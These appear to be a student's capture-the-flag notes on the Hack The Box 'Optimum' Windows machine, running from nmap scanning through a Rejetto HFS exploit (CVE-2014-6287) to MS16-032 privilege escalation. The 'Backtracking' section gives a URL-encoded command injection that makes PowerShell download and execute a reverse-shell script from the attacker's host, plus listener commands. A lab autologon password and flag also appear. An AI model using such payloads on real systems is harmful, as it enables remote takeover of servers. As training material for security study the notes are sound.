---
box: Optimum
date: 2025-09-14
category: Misc
difficulty: Very Easy
tags:
  - codeinjection
  - RCE
  - windows
start: 2025-09-14 13:40
finish: 2025-09-15 18:15

status: in-progress
---

# Box Overview – Box-2025-09-14-Optimum

##### Enumeration

- **Timestamp:** 2025-09-14 13:40
- **Action:** nmap to explore host
- **Commands:** `nmap -Av 10.129.196.11`
- **Notes:** See CLI snippet below:
``` PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
- **Next Steps:** Clearly a file server. How do we exploit? --> Investigate

##### Finding exploits

- **Timestamp:** 2025-09-14 13:54
- **Action:** Searched databases for particular exploits.
- **Commands:** Google, `msfconsole`
- **Notes:** Found CVE-2014-6287 (specifically for Rejetto http File Server). Also found exploit in metasploit database.
- **Next Steps:** Figure out how to use msf properly here.

##### Exploit Use and User Own

- **Timestamp:** 2025-09-14 14:01
- **Action:** Use existing exploit to exploit web based file service Rejetto.
- **Commands:** `msfconsole`, `search CVE-2014-6287`, `use 0`, `set RHOST <IP>`, `set LHOST <my-ip>`, `run`, `cat user.txt`
- **Notes:** Easy user own and flag.
- **Next Steps:** Privesc to get password et al.

##### Enumeration 2 (1)

- **Timestamp:** 2025-09-14 14:05
- **Action:** Began randomly enumerating but decided because I'm a n00b to use something like hacktricks for a checklist.
- **Commands:** 
	- `getuid`,`uuid`,`sysinfo`, `ps`, `pwd`<->`getwd`,
- **Notes:** 
- Sysinfo dump:
```
Computer        : OPTIMUM
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows 
```
- Used `ps` instinctively, shows running processes.
	- Interesting, some guide shows we can migrate to new processes.
	- We migrate to `explorer.exe`

##### Enumerating 2 (2)

- **Timestamp:** 2025-09-14 15:18
- **Action:** Uploaded winPEAS for better enumeration.
- **Commands:** `upload winPEAS.ps1`,`load powershell` (through meterpreter), `powershell_shell`, `./winPEAS.ps1`
- **Notes:** Stuff
- **Next Steps:** Other Stuff

##### Backtracking

- **Timestamp:** 2025-09-14 15:59
- **Action:** Establishing a python shell, meterpeter seems to be fudging winPEAS execution. Also utilize direct RCE through url with classic `%00` inclusion -> metasploit did not explain this, although I'm familiar with this type of vulnerability.
- **Commands:** `http://10.129.196.11/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString(%27http%3a//10.10.14.217/rev.ps1%27).}`, `sudo python3 -m http.server 80`, `sudo rlwrap nc -lnvp 443`, `winPEAS.exe`
- **Notes:** Better reverse shell and visibility of actual exploit.
	- In the future, when looking at webhosted applications, use skills from CWES pathway in HTB academy.
	- Hacktricks, as always, was useful for certain winPEAS related info.
	- Shell established directly to kostas desktop
- **Next Steps:**
	- Enumerate with .exe for passwords, creds, CVEs.

##### Privesc Pathway

- **Timestamp:** 2025-09-14 16:20
- **Action:** Searched through winPEAS output, found interesting creds and potential CVE.
- **Commands:** 
	- `winPEAS.ps1`
- **Notes:** 
	- autologon credential for kostas: `kdeEjDowkS*`
- **Next Steps:** 
	- Multiple payloads researched.
	- Going to try ms16_032_secondary_logon_handle_privesc

##### Success

- **Timestamp:** 2025-09-14 18:55
- **Action:** Ran https://www.rapid7.com/db/modules/exploit/windows/local/ms16_032_secondary_logon_handle_privesc/
- **Commands:** `mfconsole` with appropriate flags
- **Notes:** 
	- Managed to get root confirmed with `getuid`.
	- Had to change some options related to the shell (established over https)
```
[*] Executing exploit script...
	 __ __ ___ ___   ___     ___ ___ ___ 
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	                                    
	               [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1372

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[ref] cannot be applied to a variable that does not exist.
At line:200 char:3
+         $iJkl = [Ntdll]::NtImpersonateThread($ux, $ux, [ref]$gpl4)
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (gpl4:VariablePath) [], RuntimeException
    + FullyQualifiedErrorId : NonExistingVariableReference
 
[!] NtImpersonateThread failed, exiting..
[+] Thread resumed!

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateToken" to type "System.IntPtr": "Cannot co
nvert null to type "System.IntPtr"."
At line:259 char:2
+     $iJkl = [Advapi32]::DuplicateToken($tPnUD, 2, [ref]$kWjZ)
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
 
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

1Yu8GBJMw5b3UCht4sSqKHsCXk4S0eRL
[+] Executed on target machine.
[+] Deleted C:\Users\kostas\AppData\Local\Temp\okGqjwD.ps1
```
- Obtained root flag with simple `cat`
- Got some wonky shit with the actual reverse shell but hey, I did it.
	- Noticed in some walkthroughs post inspection that various exploits were used.
	- Typical attack path is basically exploiting system privesc after establishing a foothold.
